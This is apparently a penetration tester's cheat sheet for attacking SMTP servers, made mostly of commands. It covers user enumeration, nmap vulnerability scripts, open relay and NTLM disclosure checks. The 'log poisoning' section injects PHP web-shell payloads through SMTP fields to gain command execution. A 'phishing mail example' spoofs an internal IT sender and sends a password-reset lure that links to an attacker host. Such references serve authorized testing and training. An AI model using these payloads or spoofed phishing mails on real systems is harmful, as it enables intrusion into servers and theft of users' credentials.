## CHECKS

```md
# Check for user enumeration (VRFY / EXPN)
# Check SMTP version for known exploits
# Check for open relay
# Check for NTLM information disclosure
```
## BASIC ENUMERATION

```bash
# Connect via Telnet
telnet $ip 25

# Connect via Netcat
nc -nvv $ip 25

# Verify User
VRFY root

# Login (if supported)
USER username
PASS password

# Retrieve Mail (POP3-style servers)
RETR 1
RETR 2
```
## USER ENUMERATION

```bash
# Manual Enumeration
nc -nvv $ip 25
VRFY root

# If exists:
# 250 user@example.com

# If not exists:
# 551 User not local
```

```bash
# Automated Enumeration
sudo apt install smtp-user-enum -y

sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip
```
## NMAP SMTP ENUMERATION

```bash
# View SMTP Scripts
ls -la /usr/share/nmap/scripts/*smtp*

# Run Common SMTP Scripts
sudo nmap -p 25 --script=smtp-commands,smtp-enum-users,smtp-open-relay $ip

# Vulnerability Scripts
sudo nmap -p 25 --script=smtp-vuln* $ip

# NTLM Info Disclosure
sudo nmap -p 25 --script=smtp-ntlm-info.nse $ip
```
## SMTP LOG POISONING

```bash
# Connect
nc -nvv $ip 25
```

```bash
MAIL FROM:<attacker@gmail.com>
RCPT TO:<?php system($_GET['cmd']); ?>
DATA
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
.
QUIT
```
## SMTP OPEN RELAY TEST

```bash
telnet $ip 25

HELO test
MAIL FROM: attacker@test.com
RCPT TO: victim@external.com
DATA
Subject: Test

This is a relay test.
.
QUIT
```

If accepted for external domains → likely open relay.
## NTLM AUTH — INFORMATION DISCLOSURE

```bash
# Nmap Script
sudo nmap -p 25 --script smtp-ntlm-info.nse $ip
```

```bash
# Manual NTLM Test
telnet $ip 587
HELO
AUTH NTLM
```

If NTLM supported → server may leak domain/computer info.
## PHISHING MAIL EXAMPLE

```bash
telnet $ip 25

HELO attacker.local
MAIL FROM: it@company.com
RCPT TO: victim@company.com
DATA
Subject: Password Reset

Hi,
Please click the link to reset your password:
http://attacker-ip/

Regards,
.
QUIT
```
## SMTP COMMAND FLOW

```bash
HELO / EHLO     # Initiates session
MAIL FROM       # Sender address
RCPT TO         # Recipient address
DATA            # Start message body
.               # End message
QUIT            # Close session
```
## FULL MAIL SEND EXAMPLE

```bash
telnet $ip 25

HELO client.local
MAIL FROM:<user@client.local>
RCPT TO:<victim@server.local>
DATA
From: user@client.local
To: victim@server.local
Subject: Test Mail

Hello, this is a test message.
.
QUIT
```
## CONFIG FILES

```bash
sendmail.cf
submit.cf
```
